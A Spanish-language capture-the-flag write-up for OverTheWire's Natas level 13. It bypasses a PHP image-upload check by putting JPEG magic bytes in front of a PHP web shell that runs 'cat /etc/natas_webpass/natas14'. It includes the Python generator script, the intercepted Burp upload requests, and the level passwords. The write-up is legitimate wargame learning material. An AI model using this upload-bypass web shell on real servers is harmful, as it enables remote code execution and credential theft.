#Natas Level 12 → Level 13

Username: natas13

URL:      http://natas13.natas.labs.overthewire.org

##Write Up Iker

Abrimos un navegador y nos conectamos a la página: 

- **URL        : http://natas13.natas.labs.overthewire.org** 
- **Usuario    : natas13**
- **Contraseña : jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY**

La contraseña la hemos sacado del nivel anterior.

Accedemos a la página y nos muestra un mensaje parecido a la prueba anterior indicando que solamente podemos subir ficheros **JPG** 

```html
For security reasons, we now only accept image files!
Choose a JPEG to upload (max 1KB):
```

Vamos a ver si ha cambiado el código fuente desde la prueba anterior.

```php
<?
...
if(array_key_exists("filename", $_POST)) { 
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { 
        echo "File is not an image"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    } 
} else { 
...
```

En principio todas las demás funciones son iguales menos una parte del código de arriba que comprueba si el fichero subido es un fichero **JPG**

```php
...
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) 
{ 
        echo "File is not an image"; 
}
...
```

Bueno, en este caso tenemos que **engañar** a la función **exif_imagetype()** para que acepte el **phpShell.php** como imagen.

¿Y como hacemos eso?

Primero que nada vamos a ver que hace exactamente la funcion **exif_imagetype()**

Vamos a la página oficial de [PHP](http://php.net/docs.php) y miramos la documentación para la función [exif_imagetype](http://php.net/manual/es/function.exif-imagetype.php)

Leemos la documentación y parece que solamente **lee** los **primeros bytes** del fichero para determinar de que tipo es.

```php
exif_imagetype

(PHP 4 >= 4.3.0, PHP 5, PHP 7)
exif_imagetype — Determinar el tipo de una imagen

Descripción 

int exif_imagetype ( string $filename )
exif_imagetype() lee los primeros bytes de una imagen y comprueba su firma.
```

Ahora la pregunta es:
- ¿Cómo **cambiamos** los **primeros bytes** del fichero **phpShell.php** para que sea un **JPG**? 
- ¿Cómo sabemos que **parametro** tenemos que escribir en los **primeros bytes** del fichero para que el **fichero.php** parezca un **JPG**?

Vamos por partes. Primero tenemos que saber como identifica la función **exif_imagetype()** que un fichero es de un tipo u otro leyendo lo **primeros bytes**. 

Buscamos en **Google** acerca de los primeros bytes de los ficheros y nos encontramos con una web [Magic Numbers](https://asecuritysite.com/forensics/magic) que nos hablan de los **primero bytes** de distintos ficheros (JPG,PNG,ZIP,...) que al parecer se llaman **MAGIC NUMBERS**

A nosotros nos interesa el valor del fichero **JPG**

```html
JPEG graphic file	.jpg	FFD8
```

Por lo tanto  tenemos que cambiar los **primeros bytes** del fichero **phpShell.php** a:

```hex
FFD8
```

Podemos utilizar un **Editor Hexadecimal** para cambiarle los primeros bytes o hacer un **Script** en **Python** que nos ayude a escribir eso bytes en el fichero.

El script en **Python** es bastante sencillo de hacer, por lo que lo hacemos así :smile:

Le llamamos **phpShellPython.py** 

```python
fichero = open('phpShell.php','w')  
fichero.write('\xFF\xD8' + '<? passthru("cat /etc/natas_webpass/natas14"); ?>')  
fichero.close()
```

- 1 Abrimos el fichero **phpShell.php** en modo **escritura**
- 2 Escribimos los **primeros bytes** -> **FFD8** al fichero
- 3 Seguimos escribiendo nuestro código para que nos devuelva la contraseña
    - ```php <? passthru("cat /etc/natas_webpass/natas14"); ?> ``` 
- 4 Cerramos el fichero
    
Abrimos el editor **nano** y escribimos el código. A continuación lanzamos el script con el comando:

```bash
python phpShellPython.py
```

Bueno ya tenemos el fichero **phpShell.php** recién salido del horno y ahora solo nos queda realizar las mismas acciones que en la prueba anterior. 

Configuramos el **Proxy** a **localhost:8080** en el navegador y arrancamos el **BURP** para interceptar el tráfico que enviamos y poder modificarlo posteriormente y saltarnos los controles de acceso.

POST /index.php HTTP/1.1
Host: natas13.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas13.natas.labs.overthewire.org/
Authorization: Basic bmF0YXMxMzpqbUxUWTBxaVBaQmJhS2M5MzQxY3FQUVpCSnY3TVFiWQ==
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------453852881298197434201962635
Content-Length: 531

-----------------------------453852881298197434201962635
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------453852881298197434201962635
Content-Disposition: form-data; name="filename"

phvidqtoy7.jpg
-----------------------------453852881298197434201962635
Content-Disposition: form-data; name="uploadedfile"; filename="phpShell.php"
Content-Type: application/x-php

ÿØÿà<? passthru("cat /etc/natas_webpass/natas14"); ?>
-----------------------------453852881298197434201962635--




POST /index.php HTTP/1.1
Host: natas13.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas13.natas.labs.overthewire.org/
Authorization: Basic bmF0YXMxMzpqbUxUWTBxaVBaQmJhS2M5MzQxY3FQUVpCSnY3TVFiWQ==
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------453852881298197434201962635
Content-Length: 531

-----------------------------453852881298197434201962635
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------453852881298197434201962635
Content-Disposition: form-data; name="filename"

phvidqtoy7.jpg
-----------------------------453852881298197434201962635
Content-Disposition: form-data; name="uploadedfile"; filename="phpShell.php"
Content-Type: application/x-php

ÿØÿà<? passthru("cat /etc/natas_webpass/natas14"); ?>
-----------------------------4538528812981974342




The file upload/7nu704t5gn.php has been uploaded


http://natas13.natas.labs.overthewire.org/upload/7nu704t5gn.php

ÿØÿàLg96M10TdfaPyVBkJdjymbllQ5L6qdl1








 












 




